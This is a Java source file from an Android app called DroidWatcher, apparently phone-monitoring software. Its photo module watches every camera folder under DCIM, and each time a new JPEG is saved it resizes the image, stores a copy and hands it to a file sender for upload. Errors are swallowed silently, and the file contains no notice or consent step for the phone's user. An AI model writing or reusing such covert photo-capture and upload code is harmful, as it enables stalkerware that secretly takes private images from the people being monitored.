package com.droidwatcher.modules;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Date;

import org.acra.ACRA;

import com.droidwatcher.Debug;
import com.droidwatcher.FileSender;
import com.droidwatcher.SettingsManager;
import com.droidwatcher.FileSender.FileType;
import com.droidwatcher.lib.FileUtil;
import com.droidwatcher.lib.ImageUtil;

import android.content.Context;
import android.content.SharedPreferences;
import android.content.SharedPreferences.OnSharedPreferenceChangeListener;
import android.graphics.Bitmap;
import android.os.Environment;
import android.os.FileObserver;
import android.preference.PreferenceManager;

public class PhotoModule implements OnSharedPreferenceChangeListener {
	private ArrayList<FileObserver> mObservers;
	private Context mContext;
	
	public static final String PREFIX = "[photo]";
	
	public PhotoModule(Context context){
		this.mContext = context;
		this.mObservers = new ArrayList<FileObserver>();
		
		if (!FileUtil.isExternalStorageAvailable() || !FileUtil.hasExternalStorageFreeMemory()) {
			return;
		}
		
		File root = new File(Environment.getExternalStorageDirectory() + "/DCIM/");
		File[] files = root.listFiles();
		if (files == null) {
			return;
		}
		for (File file : files) {
			if (file.isDirectory() && !file.isHidden()) {
				mObservers.add(new MyFileObserver(file.getAbsolutePath(), FileObserver.CLOSE_WRITE));
			}
		}
		
		PreferenceManager.getDefaultSharedPreferences(context).registerOnSharedPreferenceChangeListener(this);
	}
	
	public void start(){
		if (new SettingsManager(mContext).isPhotoCaptureEnabled()) {
			startWatching();
		}
	}
	
	private void startWatching(){
		for (FileObserver observer : mObservers) {
			observer.startWatching();
		}
	}
	
	private void stopWatching(){
		for (FileObserver observer : mObservers) {
			observer.stopWatching();
		}
	}
	
	public void dispose(){
		try {
			PreferenceManager.getDefaultSharedPreferences(mContext).unregisterOnSharedPreferenceChangeListener(this);
			stopWatching();
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	@Override
	public void onSharedPreferenceChanged(SharedPreferences sharedPreferences, String key) {
		if (key.equals("CAPTURE_PHOTO")){
			SettingsManager settings = new SettingsManager(mContext);
			if (settings.isPhotoCaptureEnabled() && settings.isConnected()){
				startWatching();
			}
			else{
				stopWatching();
			}
		}
	}
	
	private class MyFileObserver extends FileObserver{
		private String lastPath;
		private String dir;
		
		public MyFileObserver(String path, int mask) {
			super(path, mask);
			
			this.lastPath = "";
			this.dir = path;
		}
		
		@Override
		public void onEvent(int event, final String path) {
			Debug.i(path + event);
			
			if (event == CLOSE_WRITE) {
				if (lastPath.equals(path) || !path.endsWith(".jpg")) {
					return;
				}
				
				lastPath = path;
				
				new Thread(new Runnable() {
					@Override
					public void run() {
						try {
							Thread.sleep(1 * 1000L);
							if (!FileUtil.isExternalStorageAvailable()) {
								return;
							}
							
							int size = new SettingsManager(mContext).capturePhotoSize();
							Bitmap bmp = ImageUtil.getResizedImage(dir + "/" + path, size);
							if (bmp != null) {
								Date dt = new Date();
								FileOutputStream out = new FileOutputStream(FileUtil.getExternalFullPath(mContext, PREFIX + "[" + dt.getTime() + "]" + path));
							    bmp.compress(Bitmap.CompressFormat.JPEG, 60, out);
							    out.close();
							    bmp.recycle();
							    
							    new FileSender(mContext, FileType.PHOTO).start();
							    
							}
						} catch (Exception e) {
							ACRA.getErrorReporter().handleSilentException(e);
						}
					}
				}).start();
			}
		}
		
	}
}
